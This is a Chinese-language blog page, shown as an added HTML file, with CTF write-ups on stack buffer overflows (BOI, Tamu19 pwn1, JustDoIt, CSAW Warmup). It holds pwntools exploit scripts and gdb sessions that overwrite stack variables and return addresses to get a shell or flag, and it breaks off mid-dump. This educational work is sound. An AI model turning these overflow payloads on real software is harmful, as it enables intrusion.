@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这一系列文章是对项目nightmare进行翻译和学习得来，是自己在学习的过程中的一些记录，可能会有些混乱，不保证文章的内容是正确无误，如果有任何问题欢迎指出。 1. BOI首先反编译程序，得到的代码如下： 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN 入门基础 - 栈溢出 - 1">
+<meta property="og:url" content="http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="这一系列文章是对项目nightmare进行翻译和学习得来，是自己在学习的过程中的一些记录，可能会有些混乱，不保证文章的内容是正确无误，如果有任何问题欢迎指出。 1. BOI首先反编译程序，得到的代码如下： 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&amp;#">
+<meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/79636b85-88fe-40fe-a0e5-aefa0d75652a.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/64764321.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/8c9f4f29-0071-4a14-a42b-ffc1d0f0f25e.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/7113f83b-8630-4f98-9280-e4393a3dfda4.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/2352cb5b-8322-4653-bd4a-41ee3b079f7f.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/58b2a2cd-f92c-4b25-9a19-399b24406201.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/abb265b0-8b94-4960-a411-5281ac68f134.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/82229180.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/82287235.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/82374797.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/82459318.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/82507819.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/08eadca3-64b4-40ca-a1f5-fa049dc10b28.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/82648937.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/53093766.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/52843100.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/52960731.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/53011703.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/53390449.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/53424974.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/76d4035d-84d4-44c8-9951-46fb4295731f.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/75812219.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/75932368.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/76572974.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/13875cc0-f103-4431-8503-4f516526e62d.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/76784372.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/76908397.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/78318956.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/77571572.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/85346488.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/85378790.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/e023e0ab-843e-4f5a-b32b-f6370598181d.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/85950964.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/90a53d4f-f8d2-4b60-a386-02c9f6954a8f.png">
+<meta property="og:image" content="http://yoursite.com/img/pwn/stack1/05582d89-77a2-4b59-ab9f-2507f5dfdf13.png">
+<meta property="article:published_time" content="2021-04-22T14:21:20.000Z">
+<meta property="article:modified_time" content="2021-04-22T15:13:25.796Z">
+<meta property="article:author" content="lex">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/img/pwn/stack1/79636b85-88fe-40fe-a0e5-aefa0d75652a.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>PWN 入门基础 - 栈溢出 - 1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/POC/">POC</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/04/07/pwn-primer-basic/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&text=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&is_video=false&description=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN 入门基础 - 栈溢出 - 1&body=Check out this article: http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&name=PWN 入门基础 - 栈溢出 - 1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&t=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-BOI"><span class="toc-number">1.</span> <span class="toc-text">1. BOI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Tamu19-pwn1"><span class="toc-number">2.</span> <span class="toc-text">2. Tamu19 pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-TokyoWesterns%E2%80%9917-JustDoIt"><span class="toc-number">3.</span> <span class="toc-text">3. TokyoWesterns’17: JustDoIt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Csaw-2016-Quals-Warmup"><span class="toc-number">4.</span> <span class="toc-text">4. Csaw 2016 Quals Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Csaw-Quals-2018-Get-It"><span class="toc-number">5.</span> <span class="toc-text">5. Csaw Quals 2018 Get It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-tuctf-2017-vulnchat"><span class="toc-number">6.</span> <span class="toc-text">6. tuctf 2017 vulnchat</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PWN 入门基础 - 栈溢出 - 1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">学习记录</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-22T14:21:20.000Z" itemprop="datePublished">2021-04-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这一系列文章是对项目<a href="'https://github.com/guyinatuxedo/nightmare'">nightmare</a>进行翻译和学习得来，是自己在学习的过程中的一些记录，可能会有些混乱，不保证文章的内容是正确无误，如果有任何问题欢迎指出。</p>
+<h2 id="1-BOI"><a href="#1-BOI" class="headerlink" title="1. BOI"></a>1. BOI</h2><p>首先反编译程序，得到的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[2]; &#x2F;&#x2F; [rsp+10h] [rbp-30h] BYREF</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [rsp+20h] [rbp-20h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  buf[0] &#x3D; 0LL;</span><br><span class="line">  buf[1] &#x3D; 0LL;</span><br><span class="line">  v5 &#x3D; 0xDEADBEEF00000000LL;</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  puts(&quot;Are you a big boiiiii??&quot;);</span><br><span class="line">  read(0, buf, 0x18uLL);</span><br><span class="line">  if ( HIDWORD(v5) &#x3D;&#x3D; -889996562 )</span><br><span class="line">    run_cmd(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">  else</span><br><span class="line">    run_cmd(&quot;&#x2F;bin&#x2F;date&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从上面的代码中可以看出，只要v5 == -889996562就可以成功启用shell，我们可以在汇编代码里可以得到具体的值为 0xCAF3BAEE</p>
+<p><img src="/img/pwn/stack1/79636b85-88fe-40fe-a0e5-aefa0d75652a.png"></p>
+<p>但是在代码中，v5已经被设置为0xDEADBEEF，这样明显是不可能成功的。但是程序对用户输入的数据 buf 没有做长度校验，那么就可以造成缓冲区溢出，如果我们能够把v5地址的值覆盖掉，那么就可以成功运行shell<br>首先查看接收用户输入的变量为buf，长度为24</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, &amp;buf, 0x18uLL);</span><br></pre></td></tr></table></figure>
+<p>接着查看var_20的偏移地址和buf的偏移地址</p>
+<p><img src="/img/pwn/stack1/64764321.png"></p>
+<p>从上面可以看到，buf和var_20的偏移地址之间差了0x10，再加上要作比较的地址v5为var_20+4，所以buf和目标地址的偏移地址为0x10+0x4 = 0x14，而且变量类型为dq，占用4个字节，要成功覆盖掉目标地址的值，所以输入的数据长度就需要为0x14 + 4 = 0x18，正好read函数也是读取0x18个字符。前面0x14的数据随意，后面4个字节的值必须为0xcaf3baee，使用pwntools来生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&quot;0&quot;*0x14 + p32(0xcaf3baee)</span><br><span class="line"># 00000000000000000000\xee\xba\xf3\xca</span><br></pre></td></tr></table></figure>
+<p>使用gdb来看看具体的情况，在0x4006a5处下断点</p>
+<p><img src="/img/pwn/stack1/8c9f4f29-0071-4a14-a42b-ffc1d0f0f25e.png"></p>
+<p>我们输入20个1，1的ASCII为31，查看栈布局</p>
+<p><img src="/img/pwn/stack1/7113f83b-8630-4f98-9280-e4393a3dfda4.png"></p>
+<p>可以看到我们输入的20个1在内存中的起始地址为 0x7fffffffe220，接着我们查看在这个地址后面的10个字节在内存中的值是多少</p>
+<p><img src="/img/pwn/stack1/2352cb5b-8322-4653-bd4a-41ee3b079f7f.png"></p>
+<p>这里看到，我们输入的20个1已经覆盖掉v5的值0xdeadbe<strong>ef</strong>的最后一个字节，v5值变成了0xdeadbe<strong>0a</strong>，被回车符号覆盖掉了。小端机器，高字节在最后，低字节在最前面，最低有效位存在内存低位。<br>现在我们的目标就是把v5覆盖成我们想要的值 0xCAF3BAEE，gdb中重新运行程序，这次我们把它覆盖为0000</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  r &lt;&lt;&lt; $(python3 -c &quot;print(&#39;1&#39;*0x14 + &#39;0&#39;*4)&quot;)</span><br></pre></td></tr></table></figure>
+<p>接着查看内存中的值，可以看到成功覆盖</p>
+<p><img src="/img/pwn/stack1/58b2a2cd-f92c-4b25-9a19-399b24406201.png"></p>
+<p>那么接下来使用pwntools生成payload进行利用即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target &#x3D; process(&#39;.&#x2F;boi&#39;)</span><br><span class="line">payload &#x3D; b&#39;0&#39;*0x14 + p32(0XCAF3BAEE)</span><br><span class="line">target.send(payload)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/pwn/stack1/abb265b0-8b94-4960-a411-5281ac68f134.png"></p>
+<h2 id="2-Tamu19-pwn1"><a href="#2-Tamu19-pwn1" class="headerlink" title="2. Tamu19 pwn1"></a>2. Tamu19 pwn1</h2><p>首先查看程序：</p>
+<p><img src="/img/pwn/stack1/82229180.png"></p>
+<p>canary没有开启，可以直接溢出覆盖栈地址, 反汇编查看pwn1的代码:</p>
+<p><img src="/img/pwn/stack1/82287235.png"></p>
+<p>从代码中可以看到，需要连续输入3次正确的结果，第一第二次可以跳过<br>第三个判断为v5 == -559869752，一个16进制数，在汇编代码中可以得到这个数为0xDEA110C8</p>
+<p><img src="/img/pwn/stack1/82374797.png"></p>
+<p>我们要做的就是覆盖掉v5（默认值为0）这个地址上的数据，把值改成0xDEA110C8，可控的变量为s，要修改的变量为var_10，查看这两个变量的偏移地址<br>var_10 偏移地址为0x10, 类型为dd，占用4个字节</p>
+<p><img src="/img/pwn/stack1/82459318.png"></p>
+<p>s 偏移地址为0x3B, 类型为db， 占用1个字节</p>
+<p><img src="/img/pwn/stack1/82507819.png"></p>
+<p>gdb中内存的位置如下：</p>
+<p><img src="/img/pwn/stack1/08eadca3-64b4-40ca-a1f5-fa049dc10b28.png"></p>
+<p>所以两者直接偏移地址相差为0x2b，所以要覆盖掉var_10的值，就绪要填充 0* 0x2b + 4byte(0xDEA110C8) 的数据，使用pwntools来生成，exploit如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;0&#39; * 0x2b</span><br><span class="line">payload +&#x3D; p32(0xDEA110C8)</span><br><span class="line"></span><br><span class="line">target &#x3D; process(&#39;.&#x2F;pwn1&#39;)</span><br><span class="line"></span><br><span class="line">p1 &#x3D; &#39;Sir Lancelot of Camelot&#39;</span><br><span class="line"></span><br><span class="line">p2 &#x3D; &#39;To seek the Holy Grail.&#39;</span><br><span class="line"></span><br><span class="line">target.sendline(p1)</span><br><span class="line">target.sendline(p2)</span><br><span class="line">target.sendline(payload)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/pwn/stack1/82648937.png"></p>
+<h2 id="3-TokyoWesterns’17-JustDoIt"><a href="#3-TokyoWesterns’17-JustDoIt" class="headerlink" title="3. TokyoWesterns’17: JustDoIt"></a>3. TokyoWesterns’17: JustDoIt</h2><p>查看程序：</p>
+<p><img src="/img/pwn/stack1/53093766.png"></p>
+<p>然后用IDA查看反汇编的代码</p>
+<p><img src="/img/pwn/stack1/52843100.png"></p>
+<p>从代码中可以看出，程序首先判断是否存在可读的flag.txt文件，然后把flag.txt文件的内容读取到flag变量中，接着获取用户输入，判断用户输入是否等于PASSWORD变量，等于则输出成功消息<br>查看PASSWORD变量的值为P@SSW0RD</p>
+<p><img src="/img/pwn/stack1/52960731.png"></p>
+<p>输入程序后，并不能输出flag</p>
+<p><img src="/img/pwn/stack1/53011703.png"></p>
+<p>我们可以看到用户输入的最长长度为32，否则就能够覆盖EIP进行RCE了，那么现在我们知道flag保存在flag变量里，而能够输出的变量则是success_message 和 failed_message，所以我们需要把failed_message的地址覆盖为flag的地址，这样程序输出错误消息的时候就能够输出flag，failed_message又赋值给变量v6，所以需要知道v6, s, flag变量的偏移地址</p>
+<p>查看得到v6变量和s变量的偏移地址如下，分别为0xc和0x20：</p>
+<p><img src="/img/pwn/stack1/53390449.png"></p>
+<p>flag变量的地址为0x804a080：</p>
+<p><img src="/img/pwn/stack1/53424974.png"></p>
+<p>所以可以构造payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;print &quot;0&quot; * 20 + &quot;\x80\xa0\x04\x08&quot;&#39; | .&#x2F;just_do_it</span><br><span class="line"># 地址从后面往前读</span><br></pre></td></tr></table></figure>
+<p><img src="/img/pwn/stack1/76d4035d-84d4-44c8-9951-46fb4295731f.png"></p>
+<h2 id="4-Csaw-2016-Quals-Warmup"><a href="#4-Csaw-2016-Quals-Warmup" class="headerlink" title="4. Csaw 2016 Quals Warmup"></a>4. Csaw 2016 Quals Warmup</h2><p>首先查看程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>运行程序, 程序输出一个地址，然后获取一个用户输入。我们使用IDA进行反编译得到的代码如下：</p>
+<p><img src="/img/pwn/stack1/75812219.png"></p>
+<p>从上面的代码中可以看出，程序输出了easy的地址，然后使用gets函数获取用户的输入赋值到v5变量，easy的具体定义如下：</p>
+<p><img src="/img/pwn/stack1/75932368.png"></p>
+<p>easy函数返回了flag的内容<br>因为gets函数没有对输入的内容做长度限制，那么就可以造成缓冲区溢出，所以可以覆盖RIP的地址，把地址指向到easy函数的地址，就能成功返回flag<br>我们需要得到v5变量的地址到rip地址之间相差了多少个字节<br>使用gdb进行调试，首先下断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000040061d &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x000000000040061e &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000400621 &lt;+4&gt;:	add    rsp,0xffffffffffffff80</span><br><span class="line">   0x0000000000400625 &lt;+8&gt;:	mov    edx,0xa</span><br><span class="line">   0x000000000040062a &lt;+13&gt;:	mov    esi,0x400741</span><br><span class="line">   0x000000000040062f &lt;+18&gt;:	mov    edi,0x1</span><br><span class="line">   0x0000000000400634 &lt;+23&gt;:	call   0x4004c0 &lt;write@plt&gt;</span><br><span class="line">   0x0000000000400639 &lt;+28&gt;:	mov    edx,0x4</span><br><span class="line">   0x000000000040063e &lt;+33&gt;:	mov    esi,0x40074c</span><br><span class="line">   0x0000000000400643 &lt;+38&gt;:	mov    edi,0x1</span><br><span class="line">   0x0000000000400648 &lt;+43&gt;:	call   0x4004c0 &lt;write@plt&gt;</span><br><span class="line">   0x000000000040064d &lt;+48&gt;:	lea    rax,[rbp-0x80]</span><br><span class="line">   0x0000000000400651 &lt;+52&gt;:	mov    edx,0x40060d</span><br><span class="line">   0x0000000000400656 &lt;+57&gt;:	mov    esi,0x400751</span><br><span class="line">   0x000000000040065b &lt;+62&gt;:	mov    rdi,rax</span><br><span class="line">   0x000000000040065e &lt;+65&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400663 &lt;+70&gt;:	call   0x400510 &lt;sprintf@plt&gt;</span><br><span class="line">   0x0000000000400668 &lt;+75&gt;:	lea    rax,[rbp-0x80]</span><br><span class="line">   0x000000000040066c &lt;+79&gt;:	mov    edx,0x9</span><br><span class="line">   0x0000000000400671 &lt;+84&gt;:	mov    rsi,rax</span><br><span class="line">   0x0000000000400674 &lt;+87&gt;:	mov    edi,0x1</span><br><span class="line">   0x0000000000400679 &lt;+92&gt;:	call   0x4004c0 &lt;write@plt&gt;</span><br><span class="line">   0x000000000040067e &lt;+97&gt;:	mov    edx,0x1</span><br><span class="line">   0x0000000000400683 &lt;+102&gt;:	mov    esi,0x400755</span><br><span class="line">   0x0000000000400688 &lt;+107&gt;:	mov    edi,0x1</span><br><span class="line">   0x000000000040068d &lt;+112&gt;:	call   0x4004c0 &lt;write@plt&gt;</span><br><span class="line">   0x0000000000400692 &lt;+117&gt;:	lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000400696 &lt;+121&gt;:	mov    rdi,rax</span><br><span class="line">   0x0000000000400699 &lt;+124&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000040069e &lt;+129&gt;:	call   0x400500 &lt;gets@plt&gt;</span><br><span class="line">   0x00000000004006a3 &lt;+134&gt;:	leave  </span><br><span class="line">   0x00000000004006a4 &lt;+135&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ b *main+134</span><br><span class="line">Breakpoint 1 at 0x4006a3</span><br></pre></td></tr></table></figure>
+<p>然后运行程序，输入内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;vuln&#x2F;nightmare&#x2F;modules&#x2F;05-bof_callfunction&#x2F;csaw16_warmup&#x2F;warmup </span><br><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;aaaaaaaaaa</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x7fffffffdca0 (&quot;aaaaaaaaaa&quot;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7dcfa00 --&gt; 0xfbad2288 </span><br><span class="line">RDX: 0x7ffff7dd18d0 --&gt; 0x0 </span><br><span class="line">RSI: 0x60226a --&gt; 0xa (&#39;\n&#39;)</span><br><span class="line">RDI: 0x7fffffffdcaa --&gt; 0x59a0000000000000 </span><br><span class="line">RBP: 0x7fffffffdce0 --&gt; 0x4006b0 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdc60 (&quot;0x40060d\n&quot;)</span><br><span class="line">RIP: 0x4006a3 (&lt;main+134&gt;:	leave)</span><br><span class="line">R8 : 0x60226b --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7b52390 